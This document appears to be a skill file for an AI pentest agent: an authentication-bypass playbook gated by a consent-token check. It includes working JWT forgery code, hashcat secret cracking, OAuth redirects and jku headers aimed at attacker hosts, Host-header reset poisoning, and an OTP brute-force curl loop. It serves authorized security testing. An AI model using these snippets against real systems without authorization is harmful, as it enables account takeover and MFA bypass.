# SKILL.md — auth-bypass

## Purpose
Comprehensive authentication bypass testing.
Covers JWT attacks, OAuth misconfigurations, session flaws, MFA bypass, and account enumeration.

---

## ⚠️ MANDATORY PRE-CHECK — CONSENT TOKEN GATE

```bash
python3 -c "
import json, sys
from datetime import datetime
try:
    with open('consent-token.json') as f:
        token = json.load(f)
    assert token.get('valid') == True
    expiry = datetime.fromisoformat(token['expires_at'])
    assert expiry > datetime.utcnow(), f'Token expired at {expiry}'
    print('[GATE PASSED] Consent verified.')
    print(f'  Authorized scope: {token.get(\"authorized_targets\")}')
except Exception as e:
    print(f'[GATE FAILED] {e}')
    sys.exit(1)
"
```

If this fails → **STOP**. No authentication testing without valid consent.

---

## Phase 1: JWT Attack Suite
→ Delegate to `tools/jwt-tool.yaml`

### 1.1 Algorithm Confusion (RS256 → HS256)
**Principle:** If server uses RS256, try signing with public key using HS256.
Some libraries use the public key as the HMAC secret when `alg=HS256`.

```python
import jwt, base64

# Get public key (from /jwks.json, certificate, or source)
public_key = open('pubkey.pem').read()

# Forge token with HS256 + public key as secret
forged = jwt.encode(
    {"sub": "admin", "role": "admin", "exp": 9999999999},
    public_key,
    algorithm="HS256"
)
```

**Test:** Send forged token → check if server accepts it.

---

### 1.2 Algorithm None Attack
**Principle:** Change `alg` to `none`, remove signature.

```python
import base64, json

header = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b'=')
payload = base64.urlsafe_b64encode(json.dumps({"sub":"admin","role":"admin"}).encode()).rstrip(b'=')
forged = f"{header.decode()}.{payload.decode()}."  # Empty signature
```

Variations to try: `none`, `None`, `NONE`, `nOnE`

---

### 1.3 Weak Secret Brute Force
```bash
# hashcat approach
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.PAYLOAD.SIG" > jwt.txt
hashcat -a 0 -m 16500 jwt.txt /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt
```

Common weak secrets: `secret`, `password`, `123456`, app name, domain name

---

### 1.4 Key Injection Attacks
- **jwk injection:** Add `"jwk"` header with attacker-controlled key
- **jku injection:** Add `"jku": "https://attacker.com/jwks.json"` 
- **kid injection:** `"kid": "../../../dev/null"` (sign with empty key)
- **x5u injection:** Point to attacker X.509 certificate

---

## Phase 2: OAuth 2.0 Misconfigurations
→ Delegate to `tools/oauth-tester.yaml`

### 2.1 Open Redirect in redirect_uri
```
GET /oauth/authorize?
  client_id=CLIENT_ID&
  redirect_uri=https://attacker.example.com&
  response_type=code&
  scope=openid
```

Bypass techniques:
- `https://legit.example.com.attacker.com` (subdomain)
- `https://legit.example.com@attacker.com` (@ symbol)
- URL encoding: `https%3A%2F%2Fattacker.com`
- Path traversal: `https://legit.example.com/../../../attacker.com`

---

### 2.2 State Parameter CSRF
- Test flow without `state` parameter
- Test with predictable `state` values
- Test state reuse across sessions

---

### 2.3 PKCE Downgrade
```
GET /oauth/authorize?
  client_id=CLIENT_ID&
  redirect_uri=https://legit.example.com/callback&
  response_type=code&
  code_challenge=dGVzdA&
  code_challenge_method=plain   ← Should be S256
```

---

## Phase 3: Session Management

### 3.1 Session Fixation
```
1. Attacker gets session ID (e.g. by visiting /login)
2. Attacker sends victim a link with their session ID
3. Victim logs in
4. Check: does session ID change after login?
```

If session ID unchanged after login → session fixation vulnerability.

---

### 3.2 Session Hijacking
- [ ] Session token in URL parameters (appears in logs/Referer)
- [ ] Predictable session tokens (sequential, timestamp-based)
- [ ] Missing Secure flag (session over HTTP)
- [ ] Missing HttpOnly flag (XSS can steal session)
- [ ] Missing SameSite attribute (CSRF possible)

```bash
# Analyze session token entropy
python3 -c "
import base64, sys
token = 'YOUR_SESSION_TOKEN_HERE'
try:
    decoded = base64.b64decode(token + '==')
    print(f'Decoded length: {len(decoded)} bytes')
    print(f'Entropy estimate: low if sequential or timestamp-based')
except: pass
"
```

---

### 3.3 Session Invalidation
- [ ] Logout doesn't invalidate server-side session
- [ ] Password change doesn't invalidate other sessions
- [ ] Old session tokens accepted after expiry

---

## Phase 4: Password Reset Flaws

### 4.1 Predictable Reset Tokens
- [ ] Token based on timestamp
- [ ] Token based on MD5(email)
- [ ] Short token (≤6 chars → brute-forceable)

### 4.2 Host Header Injection
```
POST /password-reset
Host: attacker.com   ← Injected
Content-Type: application/json
{"email": "victim@example.com"}
```
If server uses `Host` header to build reset link → link sent to victim points to attacker's server.

### 4.3 Token Reuse / No Expiry
- [ ] Use same reset token twice
- [ ] Test token validity after 24h, 7 days
- [ ] Test old token after new one requested

### 4.4 Response Manipulation
```
POST /password-reset/confirm
{"token": "WRONG_TOKEN", "new_password": "hacked"}

Response: {"success": false}
→ Intercept and change to: {"success": true}
→ Check if password actually changed
```

---

## Phase 5: MFA Bypass

### 5.1 Response Manipulation
```
POST /api/auth/verify-otp
{"otp": "000000"}

Response: {"valid": false, "message": "Invalid OTP"}
→ Intercept: change to {"valid": true}
```

### 5.2 Code Rate Limiting
```bash
for i in {000000..999999}; do
  curl -s -X POST https://target.example.com/api/auth/verify-otp \
    -d "{\"otp\": \"$i\"}" \
    -H "Content-Type: application/json" | grep -v "Invalid"
done
```

### 5.3 Skip MFA Step
```
Normal flow: /login → /mfa-verify → /dashboard
Attack: /login → /dashboard (skip MFA entirely)
```

### 5.4 OTP Leakage
- [ ] OTP in response body (verbose error)
- [ ] OTP in email + also in API response
- [ ] OTP reuse (same code valid multiple times)

---

## Phase 6: Account Enumeration

### 6.1 Login Error Differences
```
Valid user, wrong password:   "Invalid password"
Invalid user:                  "User not found"
↑ This reveals valid usernames
```

Both should return identical: `"Invalid username or password"`

### 6.2 Password Reset Enumeration
```
Valid email:   "Reset link sent to john@example.com"
Invalid email: "Email not found"
↑ Confirms valid accounts
```

### 6.3 Registration Enumeration
```
Existing email: "This email is already registered"
New email:      "Registration successful"
```

### 6.4 Timing Attacks
Even with identical messages, measure response time:
- Valid user → hashes password → slower
- Invalid user → returns immediately → faster

```bash
for email in john@example.com notexist@example.com; do
  time curl -s -X POST https://target.example.com/api/auth/login \
    -d "{\"email\": \"$email\", \"password\": \"wrong\"}" \
    -H "Content-Type: application/json"
done
```

---

## CVSS Quick Reference for Auth Findings

| Vulnerability | Typical CVSS | Score |
|---|---|---|
| Auth bypass (no creds needed) | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H | 9.8 Critical |
| JWT algorithm confusion | AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N | 7.4 High |
| OAuth open redirect + code theft | AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:N | 8.0 High |
| Session fixation | AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N | 6.8 Medium |
| MFA bypass via response manipulation | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N | 8.1 High |
| Account enumeration | AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N | 5.3 Medium |
| Weak password reset token | AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N | 7.4 High |

---

## Audit Trail

```bash
echo "[$(date -u +%Y-%m-%dT%H:%M:%SZ)] [AUTH-BYPASS] Starting authentication testing on TARGET" >> pentest-audit.log
```
